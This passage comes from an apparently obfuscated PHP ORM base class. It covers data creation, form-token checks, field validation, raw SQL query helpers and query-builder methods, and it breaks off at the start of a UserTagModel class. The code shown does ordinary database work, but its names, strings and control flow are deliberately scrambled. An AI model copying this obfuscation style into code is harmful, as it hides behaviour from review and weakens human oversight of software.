$f∂Áªö∏†§[$Eë∫É◊åñ¥[277]]) { return reset($b∆Ô∂„¶◊º[0]); } foreach ($b∆Ô∂„¶◊º as $d¶⁄«‹ï¡¿) { $Fï∂ÖÍ∞ÍÖ[] = $d¶⁄«‹ï¡¿[$B‹à˜æ™’¿]; } return $Fï∂ÖÍ∞ÍÖ; } } return null; } public function create($EıëÊ°˜¡ú = '', $BΩ¯ÌÜÉ°Â = '') { goto eñéùŸÉŸ†; C¶◊ñçÊàò: if ($this->autoCheckFields) { $dÃã•ÍÖëÙ = $this->getDbFields(); foreach ($EıëÊ°˜¡ú as $f◊°ÓƒªΩ¶ => $f˘◊ë≠«é¡) { if (!in_array($f◊°ÓƒªΩ¶, $dÃã•ÍÖëÙ)) { unset($EıëÊ°˜¡ú[$f◊°ÓƒªΩ¶]); } elseif (MAGIC_QUOTES_GPC && is_string($f˘◊ë≠«é¡)) { $EıëÊ°˜¡ú[$f◊°ÓƒªΩ¶] = stripslashes($f˘◊ë≠«é¡); } } } $this->autoOperation($EıëÊ°˜¡ú, $BΩ¯ÌÜÉ°Â); $this->data = $EıëÊ°˜¡ú; goto A‚õÜÍ◊≤ ; eñéùŸÉŸ†: $e—ûç£¥«ç =& $_SERVER[—Ω]; if (empty($EıëÊ°˜¡ú)) { $EıëÊ°˜¡ú = $_POST; } elseif (is_object($EıëÊ°˜¡ú)) { $EıëÊ°˜¡ú = get_object_vars($EıëÊ°˜¡ú); } if (empty($EıëÊ°˜¡ú) || !is_array($EıëÊ°˜¡ú)) { $this->error = think_lang($e—ûç£¥«ç[256]); return !1; } goto B¶ÀÛ‰Ñ˘ü; c≠„çá›éÕ: if (isset($dÃã•ÍÖëÙ)) { if (is_string($dÃã•ÍÖëÙ)) { $dÃã•ÍÖëÙ = explode($e—ûç£¥«ç[47], $dÃã•ÍÖëÙ); } if (think_config($e—ûç£¥«ç[283])) { $dÃã•ÍÖëÙ[] = think_config($e—ûç£¥«ç[284]); } foreach ($EıëÊ°˜¡ú as $f◊°ÓƒªΩ¶ => $f˘◊ë≠«é¡) { if (!in_array($f◊°ÓƒªΩ¶, $dÃã•ÍÖëÙ)) { unset($EıëÊ°˜¡ú[$f◊°ÓƒªΩ¶]); } } } if (!$this->autoValidation($EıëÊ°˜¡ú, $BΩ¯ÌÜÉ°Â)) { return !1; } if (!$this->autoCheckToken($EıëÊ°˜¡ú)) { $this->error = think_lang($e—ûç£¥«ç[285]); return !1; } goto C¶◊ñçÊàò; B¶ÀÛ‰Ñ˘ü: $EıëÊ°˜¡ú = $this->parseFieldsMap($EıëÊ°˜¡ú, 0); $BΩ¯ÌÜÉ°Â = $BΩ¯ÌÜÉ°Â ? $BΩ¯ÌÜÉ°Â : (!empty($EıëÊ°˜¡ú[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$e—ûç£¥«ç[258]])) { $dÃã•ÍÖëÙ = $this->options[$e—ûç£¥«ç[258]]; unset($this->options[$e—ûç£¥«ç[258]]); } elseif ($BΩ¯ÌÜÉ°Â == THINK_MODEL_INSERT && isset($this->insertFields)) { $dÃã•ÍÖëÙ = $this->insertFields; } elseif ($BΩ¯ÌÜÉ°Â == THINK_MODEL_UPDATE && isset($this->updateFields)) { $dÃã•ÍÖëÙ = $this->updateFields; } goto c≠„çá›éÕ; A‚õÜÍ◊≤ : return $EıëÊ°˜¡ú; goto Aü√…ÍàîÌ; Aü√…ÍàîÌ: } public function autoCheckToken($Eíö‘¯Ωµ´) { $dˆ·∆ÕòÍÉ =& $_SERVER[—Ω]; if (isset($this->options[$dˆ·∆ÕòÍÉ[286]]) && !$this->options[$dˆ·∆ÕòÍÉ[286]]) { return !0; } if (think_config($dˆ·∆ÕòÍÉ[283])) { $Cëü«òë˜É = think_config($dˆ·∆ÕòÍÉ[284]); if (!isset($Eíö‘¯Ωµ´[$Cëü«òë˜É]) || Session::get($Cëü«òë˜É)) { return !1; } list($Añ„Èµ“¬…, $f¯Ãè€ÆÖ) = explode($dˆ·∆ÕòÍÉ[70], $Eíö‘¯Ωµ´[$Cëü«òë˜É]); if ($f¯Ãè€ÆÖ && Session::get($Cëü«òë˜É . $dˆ·∆ÕòÍÉ[93] . $Añ„Èµ“¬…) === $f¯Ãè€ÆÖ) { Session::remove($Cëü«òë˜É . $dˆ·∆ÕòÍÉ[93] . $Añ„Èµ“¬…); return !0; } if (think_config($dˆ·∆ÕòÍÉ[287])) { Session::remove($Cëü«òë˜É . $dˆ·∆ÕòÍÉ[93] . $Añ„Èµ“¬…); } return !1; } return !0; } public function regex($B∏ûà¯â∏Ù, $A√ËÜÛÕ¨Ù) { $FÔò”éÊù⁄ =& $_SERVER[—Ω]; $a¿ˆú°Œé” = array($FÔò”éÊù⁄[288] => $FÔò”éÊù⁄[289], $FÔò”éÊù⁄[290] => $FÔò”éÊù⁄[291], $FÔò”éÊù⁄[292] => $FÔò”éÊù⁄[293], $FÔò”éÊù⁄[294] => $FÔò”éÊù⁄[295], $FÔò”éÊù⁄[296] => $FÔò”éÊù⁄[297], $FÔò”éÊù⁄[298] => $FÔò”éÊù⁄[299], $FÔò”éÊù⁄[300] => $FÔò”éÊù⁄[301], $FÔò”éÊù⁄[275] => $FÔò”éÊù⁄[302], $FÔò”éÊù⁄[303] => $FÔò”éÊù⁄[304]); if (isset($a¿ˆú°Œé”[strtolower($A√ËÜÛÕ¨Ù)])) { $A√ËÜÛÕ¨Ù = $a¿ˆú°Œé”[strtolower($A√ËÜÛÕ¨Ù)]; } return preg_match($A√ËÜÛÕ¨Ù, $B∏ûà¯â∏Ù) === 1; } private function autoOperation(&$AåöµÚ∫≠Ÿ, $Aﬁ™µûÑÛÌ) { $BÚº øå∂Œ =& $_SERVER[—Ω]; if (!empty($this->options[$BÚº øå∂Œ[305]])) { $aäÖáÛñ√ÿ = $this->options[$BÚº øå∂Œ[305]]; unset($this->options[$BÚº øå∂Œ[305]]); } elseif (!empty($this->_auto)) { $aäÖáÛñ√ÿ = $this->_auto; } if (isset($aäÖáÛñ√ÿ)) { foreach ($aäÖáÛñ√ÿ as $Fóòõ§î®∆) { if (empty($Fóòõ§î®∆[2])) { $Fóòõ§î®∆[2] = THINK_MODEL_INSERT; } if ($Aﬁ™µûÑÛÌ == $Fóòõ§î®∆[2] || $Fóòõ§î®∆[2] == THINK_MODEL_BOTH) { switch (trim($Fóòõ§î®∆[3])) { case $BÚº øå∂Œ[306]: case $BÚº øå∂Œ[307]: $Fü„ëÁÍ§Ü = isset($Fóòõ§î®∆[4]) ? (array) $Fóòõ§î®∆[4] : array(); if (isset($AåöµÚ∫≠Ÿ[$Fóòõ§î®∆[0]])) { array_unshift($Fü„ëÁÍ§Ü, $AåöµÚ∫≠Ÿ[$Fóòõ§î®∆[0]]); } if ($BÚº øå∂Œ[306] == $Fóòõ§î®∆[3]) { $AåöµÚ∫≠Ÿ[$Fóòõ§î®∆[0]] = call_user_func_array($Fóòõ§î®∆[1], $Fü„ëÁÍ§Ü); } else { $AåöµÚ∫≠Ÿ[$Fóòõ§î®∆[0]] = call_user_func_array(array(&$this, $Fóòõ§î®∆[1]), $Fü„ëÁÍ§Ü); } break; case $BÚº øå∂Œ[258]: $AåöµÚ∫≠Ÿ[$Fóòõ§î®∆[0]] = $AåöµÚ∫≠Ÿ[$Fóòõ§î®∆[1]]; break; case $BÚº øå∂Œ[308]: if ($BÚº øå∂Œ[33] === $AåöµÚ∫≠Ÿ[$Fóòõ§î®∆[0]]) { unset($AåöµÚ∫≠Ÿ[$Fóòõ§î®∆[0]]); } break; case $BÚº øå∂Œ[309]: default: $AåöµÚ∫≠Ÿ[$Fóòõ§î®∆[0]] = $Fóòõ§î®∆[1]; } if (!1 === $AåöµÚ∫≠Ÿ[$Fóòõ§î®∆[0]]) { unset($AåöµÚ∫≠Ÿ[$Fóòõ§î®∆[0]]); } } } } return $AåöµÚ∫≠Ÿ; } protected function autoValidation($CíÌﬂ·œôÔ, $CÍÍÑ’îäî) { $aà¨√∑à›ˆ =& $_SERVER[—Ω]; if (!empty($this->options[$aà¨√∑à›ˆ[310]])) { $Aëëóπõ„ˆ = $this->options[$aà¨√∑à›ˆ[310]]; unset($this->options[$aà¨√∑à›ˆ[310]]); } elseif (!empty($this->_validate)) { $Aëëóπõ„ˆ = $this->_validate; } if (isset($Aëëóπõ„ˆ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($Aëëóπõ„ˆ as $Bå—Î£Øü => $F⁄ç√‡∞„˜) { if (empty($F⁄ç√‡∞„˜[5]) || $F⁄ç√‡∞„˜[5] == THINK_MODEL_BOTH || $F⁄ç√‡∞„˜[5] == $CÍÍÑ’îäî) { if (0 == strpos($F⁄ç√‡∞„˜[2], $aà¨√∑à›ˆ[311]) && strpos($F⁄ç√‡∞„˜[2], $aà¨√∑à›ˆ[312])) { $F⁄ç√‡∞„˜[2] = think_lang(substr($F⁄ç√‡∞„˜[2], 2, -1)); } $F⁄ç√‡∞„˜[3] = isset($F⁄ç√‡∞„˜[3]) ? $F⁄ç√‡∞„˜[3] : THINK_EXISTS_VALIDATE; $F⁄ç√‡∞„˜[4] = isset($F⁄ç√‡∞„˜[4]) ? $F⁄ç√‡∞„˜[4] : $aà¨√∑à›ˆ[313]; switch ($F⁄ç√‡∞„˜[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($CíÌﬂ·œôÔ, $F⁄ç√‡∞„˜)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($aà¨√∑à›ˆ[33] != trim($CíÌﬂ·œôÔ[$F⁄ç√‡∞„˜[0]])) { if (!1 === $this->_validationField($CíÌﬂ·œôÔ, $F⁄ç√‡∞„˜)) { return !1; } } break; default: if (isset($CíÌﬂ·œôÔ[$F⁄ç√‡∞„˜[0]])) { if (!1 === $this->_validationField($CíÌﬂ·œôÔ, $F⁄ç√‡∞„˜)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($f…Ÿô€≠∏ß, $fèã¿çÙÑµ) { if (!1 === $this->_validationFieldItem($f…Ÿô€≠∏ß, $fèã¿çÙÑµ)) { if ($this->patchValidate) { $this->error[$fèã¿çÙÑµ[0]] = $fèã¿çÙÑµ[2]; } else { $this->error = $fèã¿çÙÑµ[2]; return !1; } } return; } protected function _validationFieldItem($D±èëÊπ¡º, $Cë†≠òæØ÷) { $c≠í‡Çà‚è =& $_SERVER[—Ω]; switch (strtolower(trim($Cë†≠òæØ÷[4]))) { case $c≠í‡Çà‚è[306]: case $c≠í‡Çà‚è[307]: $AØ¡∂¬ΩÕ´ = isset($Cë†≠òæØ÷[6]) ? (array) $Cë†≠òæØ÷[6] : array(); if (is_string($Cë†≠òæØ÷[0]) && strpos($Cë†≠òæØ÷[0], $c≠í‡Çà‚è[47])) { $Cë†≠òæØ÷[0] = explode($c≠í‡Çà‚è[47], $Cë†≠òæØ÷[0]); } if (is_array($Cë†≠òæØ÷[0])) { foreach ($Cë†≠òæØ÷[0] as $a§Üà±≤«) { $C“†ïæ≤…ú[$a§Üà±≤«] = $D±èëÊπ¡º[$a§Üà±≤«]; } array_unshift($AØ¡∂¬ΩÕ´, $C“†ïæ≤…ú); } else { array_unshift($AØ¡∂¬ΩÕ´, $D±èëÊπ¡º[$Cë†≠òæØ÷[0]]); } if ($c≠í‡Çà‚è[306] == $Cë†≠òæØ÷[4]) { return call_user_func_array($Cë†≠òæØ÷[1], $AØ¡∂¬ΩÕ´); } else { return call_user_func_array(array(&$this, $Cë†≠òæØ÷[1]), $AØ¡∂¬ΩÕ´); } case $c≠í‡Çà‚è[314]: return $D±èëÊπ¡º[$Cë†≠òæØ÷[0]] == $D±èëÊπ¡º[$Cë†≠òæØ÷[1]]; case $c≠í‡Çà‚è[315]: if (is_string($Cë†≠òæØ÷[0]) && strpos($Cë†≠òæØ÷[0], $c≠í‡Çà‚è[47])) { $Cë†≠òæØ÷[0] = explode($c≠í‡Çà‚è[47], $Cë†≠òæØ÷[0]); } $A¿ ◊êı≤í = array(); if (is_array($Cë†≠òæØ÷[0])) { foreach ($Cë†≠òæØ÷[0] as $a§Üà±≤«) { $A¿ ◊êı≤í[$a§Üà±≤«] = $D±èëÊπ¡º[$a§Üà±≤«]; } } else { $A¿ ◊êı≤í[$Cë†≠òæØ÷[0]] = $D±èëÊπ¡º[$Cë†≠òæØ÷[0]]; } if (!empty($D±èëÊπ¡º[$this->getPk()])) { $A¿ ◊êı≤í[$this->getPk()] = array($c≠í‡Çà‚è[316], $D±èëÊπ¡º[$this->getPk()]); } if ($this->where($A¿ ◊êı≤í)->find()) { return !1; } return !0; default: return $this->check($D±èëÊπ¡º[$Cë†≠òæØ÷[0]], $Cë†≠òæØ÷[1], $Cë†≠òæØ÷[4]); } } public function check($FÂä‘Áºí, $bÁƒÔ¨•Úó, $cõ¶õ°ªúÜ = "\162\145\147\145\170") { $fÀ≠áë–À• =& $_SERVER[—Ω]; $cõ¶õ°ªúÜ = strtolower(trim($cõ¶õ°ªúÜ)); switch ($cõ¶õ°ªúÜ) { case $fÀ≠áë–À•[7]: case $fÀ≠áë–À•[317]: $fåÒ•¡ÑÂ = is_array($bÁƒÔ¨•Úó) ? $bÁƒÔ¨•Úó : explode($fÀ≠áë–À•[47], $bÁƒÔ¨•Úó); return $cõ¶õ°ªúÜ == $fÀ≠áë–À•[7] ? in_array($FÂä‘Áºí, $fåÒ•¡ÑÂ) : !in_array($FÂä‘Áºí, $fåÒ•¡ÑÂ); case $fÀ≠áë–À•[318]: case $fÀ≠áë–À•[319]: if (is_array($bÁƒÔ¨•Úó)) { $E«Ì¬ò¥òÍ = $bÁƒÔ¨•Úó[0]; $fè˜ø»ç©´ = $bÁƒÔ¨•Úó[1]; } else { list($E«Ì¬ò¥òÍ, $fè˜ø»ç©´) = explode($fÀ≠áë–À•[47], $bÁƒÔ¨•Úó); } return $cõ¶õ°ªúÜ == $fÀ≠áë–À•[318] ? $FÂä‘Áºí >= $E«Ì¬ò¥òÍ && $FÂä‘Áºí <= $fè˜ø»ç©´ : $FÂä‘Áºí < $E«Ì¬ò¥òÍ || $FÂä‘Áºí > $fè˜ø»ç©´; case $fÀ≠áë–À•[320]: case $fÀ≠áë–À•[321]: return $cõ¶õ°ªúÜ == $fÀ≠áë–À•[320] ? $FÂä‘Áºí == $bÁƒÔ¨•Úó : $FÂä‘Áºí != $bÁƒÔ¨•Úó; case $fÀ≠áë–À•[322]: $Eıˆ…âÇ—• = mb_strlen($FÂä‘Áºí, $fÀ≠áë–À•[323]); if (strpos($bÁƒÔ¨•Úó, $fÀ≠áë–À•[47])) { list($E«Ì¬ò¥òÍ, $fè˜ø»ç©´) = explode($fÀ≠áë–À•[47], $bÁƒÔ¨•Úó); return $Eıˆ…âÇ—• >= $E«Ì¬ò¥òÍ && $Eıˆ…âÇ—• <= $fè˜ø»ç©´; } else { return $Eıˆ…âÇ—• == $bÁƒÔ¨•Úó; } case $fÀ≠áë–À•[324]: list($fæÉƒá£˘¶, $eº∫ù‡ª‚◊) = explode($fÀ≠áë–À•[47], $bÁƒÔ¨•Úó); if (!is_numeric($fæÉƒá£˘¶)) { $fæÉƒá£˘¶ = strtotime($fæÉƒá£˘¶); } if (!is_numeric($eº∫ù‡ª‚◊)) { $eº∫ù‡ª‚◊ = strtotime($eº∫ù‡ª‚◊); } return NOW_TIME >= $fæÉƒá£˘¶ && NOW_TIME <= $eº∫ù‡ª‚◊; case $fÀ≠áë–À•[325]: return in_array(get_client_ip(), explode($fÀ≠áë–À•[47], $bÁƒÔ¨•Úó)); case $fÀ≠áë–À•[326]: return !in_array(get_client_ip(), explode($fÀ≠áë–À•[47], $bÁƒÔ¨•Úó)); case $fÀ≠áë–À•[313]: default: return $this->regex($FÂä‘Áºí, $bÁƒÔ¨•Úó); } } public function query($aı‡À¬õ€Õ, $BÌ¨ﬂãÃÃâ = false) { $Aûá¢ãÈ∑Á =& $_SERVER[—Ω]; if (!is_bool($BÌ¨ﬂãÃÃâ) && !is_array($BÌ¨ﬂãÃÃâ)) { $BÌ¨ﬂãÃÃâ = func_get_args(); array_shift($BÌ¨ﬂãÃÃâ); } $aı‡À¬õ€Õ = str_replace(array($Aûá¢ãÈ∑Á[214], $Aûá¢ãÈ∑Á[327]), $Aûá¢ãÈ∑Á[50], $aı‡À¬õ€Õ); $aı‡À¬õ€Õ = $this->parseSql($aı‡À¬õ€Õ, $BÌ¨ﬂãÃÃâ); return $this->db->query($aı‡À¬õ€Õ); } public function execute($f∑¶£°¨„ú, $bŒ∆íæ›‰¢ = false) { if (!is_bool($bŒ∆íæ›‰¢) && !is_array($bŒ∆íæ›‰¢)) { $bŒ∆íæ›‰¢ = func_get_args(); array_shift($bŒ∆íæ›‰¢); } $f∑¶£°¨„ú = $this->parseSql($f∑¶£°¨„ú, $bŒ∆íæ›‰¢); return $this->db->execute($f∑¶£°¨„ú); } protected function parseSql($d∂ìæÖéΩñ, $A◊´£Ÿøƒ◊) { $C£ë¥åﬂΩ∏ =& $_SERVER[—Ω]; if (!0 === $A◊´£Ÿøƒ◊) { $båÚ∏”è™« = $this->_parseOptions(); $d∂ìæÖéΩñ = $this->db->parseSql($d∂ìæÖéΩñ, $båÚ∏”è™«); } elseif (is_array($A◊´£Ÿøƒ◊)) { $A◊´£Ÿøƒ◊ = array_map(array($this->db, $C£ë¥åﬂΩ∏[328]), $A◊´£Ÿøƒ◊); $d∂ìæÖéΩñ = vsprintf($d∂ìæÖéΩñ, $A◊´£Ÿøƒ◊); } else { $d∂ìæÖéΩñ = strtr($d∂ìæÖéΩñ, array($C£ë¥åﬂΩ∏[329] => $this->getTableName(), $C£ë¥åﬂΩ∏[330] => think_config($C£ë¥åﬂΩ∏[229]))); } $this->db->setModel($this->name); return $d∂ìæÖéΩñ; } public function db($B≠â…êéáœ = '', $fô≥¿ÎÉÁÖ = '', $AºÑàÒÜ¿ë = array()) { goto aÏò÷«ºËÕ; eÉÌÀÂ“à°: $eß∑Ωµà„¢[$B≠â…êéáœ] = $fô≥¿ÎÉÁÖ; $this->db = $CÉÖÖ¬∫¨´[$B≠â…êéáœ]; $this->_after_db(); goto c÷è‰àôöè; c÷è‰àôöè: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto cá¢◊˘ªç√; aÏò÷«ºËÕ: $aÌû”‹†Ú± =& $_SERVER[—Ω]; if ($aÌû”‹†Ú±[33] === $B≠â…êéáœ && $this->db) { return $this->db; } static $eß∑Ωµà„¢ = array(); goto dùµÛèæâ‚; dùµÛèæâ‚: static $CÉÖÖ¬∫¨´ = array(); if (!isset($CÉÖÖ¬∫¨´[$B≠â…êéáœ]) || isset($CÉÖÖ¬∫¨´[$B≠â…êéáœ]) && $fô≥¿ÎÉÁÖ && $eß∑Ωµà„¢[$B≠â…êéáœ] != $fô≥¿ÎÉÁÖ) { if (!empty($fô≥¿ÎÉÁÖ) && is_string($fô≥¿ÎÉÁÖ) && !1 === strpos($fô≥¿ÎÉÁÖ, $aÌû”‹†Ú±[8])) { $fô≥¿ÎÉÁÖ = think_config($fô≥¿ÎÉÁÖ); } $CÉÖÖ¬∫¨´[$B≠â…êéáœ] = Db::getInstance($fô≥¿ÎÉÁÖ); } elseif (NULL === $fô≥¿ÎÉÁÖ) { $CÉÖÖ¬∫¨´[$B≠â…êéáœ]->close(); unset($CÉÖÖ¬∫¨´[$B≠â…êéáœ]); return; } if (!empty($AºÑàÒÜ¿ë)) { if (is_string($AºÑàÒÜ¿ë)) { parse_str($AºÑàÒÜ¿ë, $AºÑàÒÜ¿ë); } foreach ($AºÑàÒÜ¿ë as $aÎ˘ö†¯±ç => $eê±¿Ÿƒä ) { $this->setProperty($aÎ˘ö†¯±ç, $eê±¿Ÿƒä ); } } goto eÉÌÀÂ“à°; cá¢◊˘ªç√: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $eå®πŒå∑â = get_class($this); if ($eå®πŒå∑â == $_SERVER[—Ω][331]) { return $this->name; } $this->name = substr($eå®πŒå∑â, 0, -5); } return $this->name; } public function getTableName() { $Bìı˜ºòÇì =& $_SERVER[—Ω]; if (empty($this->trueTableName)) { $aæ·õﬂ≠≤∞ = !empty($this->tablePrefix) ? $this->tablePrefix : $Bìı˜ºòÇì[33]; if (!empty($this->tableName)) { $aæ·õﬂ≠≤∞ .= $this->tableName; } else { $aæ·õﬂ≠≤∞ .= think_parse_name($this->name); } $this->trueTableName = strtolower($aæ·õﬂ≠≤∞); } return (!empty($this->dbName) ? $this->dbName . $Bìı˜ºòÇì[93] : $Bìı˜ºòÇì[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $BöµÉ”°Ñ =& $_SERVER[—Ω]; return isset($this->fields[$BöµÉ”°Ñ[236]]) ? $this->fields[$BöµÉ”°Ñ[236]] : $this->pk; } public function getDbFields() { $Bπ€¬êè™ˆ =& $_SERVER[—Ω]; if (isset($this->options[$Bπ€¬êè™ˆ[264]])) { $f¡ê˜ô·•Ö = $this->db->getFields($this->options[$Bπ€¬êè™ˆ[264]]); return $f¡ê˜ô·•Ö ? array_keys($f¡ê˜ô·•Ö) : !1; } if ($this->fields) { $f¡ê˜ô·•Ö = $this->fields; unset($f¡ê˜ô·•Ö[$Bπ€¬êè™ˆ[235]], $f¡ê˜ô·•Ö[$Bπ€¬êè™ˆ[236]], $f¡ê˜ô·•Ö[$Bπ€¬êè™ˆ[237]], $f¡ê˜ô·•Ö[$Bπ€¬êè™ˆ[234]]); return $f¡ê˜ô·•Ö; } return !1; } public function data($EíÔ´é»øå = '') { $DÓÜ“Â∞ÿª =& $_SERVER[—Ω]; if ($DÓÜ“Â∞ÿª[33] === $EíÔ´é»øå && !empty($this->data)) { return $this->data; } if (is_object($EíÔ´é»øå)) { $EíÔ´é»øå = get_object_vars($EíÔ´é»øå); } elseif (is_string($EíÔ´é»øå)) { parse_str($EíÔ´é»øå, $EíÔ´é»øå); } elseif (!is_array($EíÔ´é»øå)) { think_exception(think_lang($DÓÜ“Â∞ÿª[256])); } $this->data = $EíÔ´é»øå; return $this; } public function join($fÜœ§‘¯Œπ) { $bë©ƒôﬂãß =& $_SERVER[—Ω]; if (is_array($fÜœ§‘¯Œπ)) { $this->options[$bë©ƒôﬂãß[267]] = $fÜœ§‘¯Œπ; } elseif (!empty($fÜœ§‘¯Œπ)) { $this->options[$bë©ƒôﬂãß[267]][] = $fÜœ§‘¯Œπ; } return $this; } public function union($CŒ£÷¿”üê, $aﬁÊàÇÈâ‹ = false) { goto f‡îˆò¬Ï´; d—∞¢öÙ◊—: if (is_object($CŒ£÷¿”üê)) { $CŒ£÷¿”üê = get_object_vars($CŒ£÷¿”üê); } if (is_string($CŒ£÷¿”üê)) { $AâŒê∑¯¶¿ = $CŒ£÷¿”üê; } elseif (is_array($CŒ£÷¿”üê)) { if (isset($CŒ£÷¿”üê[0])) { $this->options[$d°Ú‡ÎÌö[332]] = array_merge($this->options[$d°Ú‡ÎÌö[332]], $CŒ£÷¿”üê); return $this; } else { $AâŒê∑¯¶¿ = $CŒ£÷¿”üê; } } else { think_exception(think_lang($d°Ú‡ÎÌö[256])); } $this->options[$d°Ú‡ÎÌö[332]][] = $AâŒê∑¯¶¿; goto E∫ŸÓÆ ıí; E∫ŸÓÆ ıí: return $this; goto Dâ≠›çíä‚; f‡îˆò¬Ï´: $d°Ú‡ÎÌö =& $_SERVER[—Ω]; if (empty($CŒ£÷¿”üê)) { return $this; } if ($aﬁÊàÇÈâ‹) { $this->options[$d°Ú‡ÎÌö[332]][$d°Ú‡ÎÌö[333]] = !0; } goto d—∞¢öÙ◊—; Dâ≠›çíä‚: } public function cache($e∏à√àá·È = true, $CºÜˆû∆ˆø = null, $cá›ﬁ€Ì´© = '') { $CÃÊﬂ¬ÃÈ√ =& $_SERVER[—Ω]; if (!1 !== $e∏à√àá·È) { $this->options[$CÃÊﬂ¬ÃÈ√[334]] = array($CÃÊﬂ¬ÃÈ√[89] => $e∏à√àá·È, $CÃÊﬂ¬ÃÈ√[324] => $CºÜˆû∆ˆø, $CÃÊﬂ¬ÃÈ√[29] => $cá›ﬁ€Ì´©); } return $this; } public function field($CÏ‘ŒΩé∑å, $eæœãã”ú∑ = false) { $b¯Ø¶»ì—¯ =& $_SERVER[—Ω]; if (!0 === $CÏ‘ŒΩé∑å) { $B¨ÕâïÍ‹⁄ = $this->getDbFields(); $CÏ‘ŒΩé∑å = $B¨ÕâïÍ‹⁄ ? $B¨ÕâïÍ‹⁄ : $b¯Ø¶»ì—¯[173]; } elseif ($eæœãã”ú∑) { if (is_string($CÏ‘ŒΩé∑å)) { $CÏ‘ŒΩé∑å = explode($b¯Ø¶»ì—¯[47], $CÏ‘ŒΩé∑å); } $B¨ÕâïÍ‹⁄ = $this->getDbFields(); $CÏ‘ŒΩé∑å = $B¨ÕâïÍ‹⁄ ? array_diff($B¨ÕâïÍ‹⁄, $CÏ‘ŒΩé∑å) : $CÏ‘ŒΩé∑å; } $this->options[$b¯Ø¶»ì—¯[258]] = $CÏ‘ŒΩé∑å; return $this; } public function scope($EôÊ∑øá÷ü = '', $EÚúèÉ€Ìë = NULL) { $A‚âÁ»¯†É =& $_SERVER[—Ω]; if ($A‚âÁ»¯†É[33] === $EôÊ∑øá÷ü) { if (isset($this->_scope[$A‚âÁ»¯†É[34]])) { $E€¡Õ’Ïéé = $this->_scope[$A‚âÁ»¯†É[34]]; } else { return $this; } } elseif (is_string($EôÊ∑øá÷ü)) { $Fƒ€ÒãÉÑô = explode($A‚âÁ»¯†É[47], $EôÊ∑øá÷ü); $E€¡Õ’Ïéé = array(); foreach ($Fƒ€ÒãÉÑô as $BàÚ™ûÃ≠‹) { if (!isset($this->_scope[$BàÚ™ûÃ≠‹])) { continue; } $E€¡Õ’Ïéé = array_merge($E€¡Õ’Ïéé, $this->_scope[$BàÚ™ûÃ≠‹]); } if (!empty($EÚúèÉ€Ìë) && is_array($EÚúèÉ€Ìë)) { $E€¡Õ’Ïéé = array_merge($E€¡Õ’Ïéé, $EÚúèÉ€Ìë); } } elseif (is_array($EôÊ∑øá÷ü)) { $E€¡Õ’Ïéé = $EôÊ∑øá÷ü; } if (is_array($E€¡Õ’Ïéé) && !empty($E€¡Õ’Ïéé)) { $this->options = array_merge($this->options, array_change_key_case($E€¡Õ’Ïéé)); } return $this; } public function where($eÓ—˜Ω·≥ò, $FÏâèÍû…Ñ = null) { $Eòá€ÉıÓ± =& $_SERVER[—Ω]; if (!is_null($FÏâèÍû…Ñ) && is_string($eÓ—˜Ω·≥ò)) { if (!is_array($FÏâèÍû…Ñ)) { $FÏâèÍû…Ñ = func_get_args(); array_shift($FÏâèÍû…Ñ); } $FÏâèÍû…Ñ = array_map(array($this->db, $Eòá€ÉıÓ±[328]), $FÏâèÍû…Ñ); $eÓ—˜Ω·≥ò = vsprintf($eÓ—˜Ω·≥ò, $FÏâèÍû…Ñ); } elseif (is_object($eÓ—˜Ω·≥ò)) { $eÓ—˜Ω·≥ò = get_object_vars($eÓ—˜Ω·≥ò); } elseif (is_array($eÓ—˜Ω·≥ò)) { foreach ($eÓ—˜Ω·≥ò as $cãæ›‹«∞ü => $DòÇØüèºô) { if ((is_numeric($cãæ›‹«∞ü) || !$cãæ›‹«∞ü) && is_string($DòÇØüèºô)) { think_trace($Eòá€ÉıÓ±[335], $Eòá€ÉıÓ±[33], $Eòá€ÉıÓ±[46]); die; } } } if (is_string($eÓ—˜Ω·≥ò) && $Eòá€ÉıÓ±[33] != $eÓ—˜Ω·≥ò) { $CÂ¢Ûˆß = array(); $CÂ¢Ûˆß[$Eòá€ÉıÓ±[336]] = $eÓ—˜Ω·≥ò; $eÓ—˜Ω·≥ò = $CÂ¢Ûˆß; } if (isset($this->options[$Eòá€ÉıÓ±[260]])) { $this->options[$Eòá€ÉıÓ±[260]] = array_merge($this->options[$Eòá€ÉıÓ±[260]], $eÓ—˜Ω·≥ò); } else { $this->options[$Eòá€ÉıÓ±[260]] = $eÓ—˜Ω·≥ò; } return $this; } public function limit($Eû‹¡¶ËÔú, $C›ã∑ÏΩ… = null) { $e£äí¿ÉÀº =& $_SERVER[—Ω]; $this->options[$e£äí¿ÉÀº[277]] = is_null($C›ã∑ÏΩ…) ? $Eû‹¡¶ËÔú : $Eû‹¡¶ËÔú . $e£äí¿ÉÀº[47] . $C›ã∑ÏΩ…; return $this; } public function page($c”œÖ“˜Ï’, $eÜ™Ú‰¥á„ = null) { $Bµü›é¬πé =& $_SERVER[—Ω]; $this->options[$Bµü›é¬πé[337]] = is_null($eÜ™Ú‰¥á„) ? $c”œÖ“˜Ï’ : $c”œÖ“˜Ï’ . $Bµü›é¬πé[47] . $eÜ™Ú‰¥á„; return $this; } public function comment($EŸ‰û®ÆÇó) { $this->options[$_SERVER[—Ω][338]] = $EŸ‰û®ÆÇó; return $this; } public function setProperty($dÛï÷éÀ¥•, $Cπú¶»õ∏á) { if (property_exists($this, $dÛï÷éÀ¥•)) { $this->{$dÛï÷éÀ¥•} = $Cπú¶»õ∏á; } return $this; } } goto Aπ®õ•…Ú°; BÏÑ»®ÿÎ…: class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\x65\162\56\164\x61\147\114\151\x73\164"; public $modelType = "\125\163\x65\162\x4f\x70\164\x69\x6f\156"; public $field = array("\x6e\x61\155\x65", "\163\x74\x79\x6c\x65", "\x73\x6f\162\x74"); public function 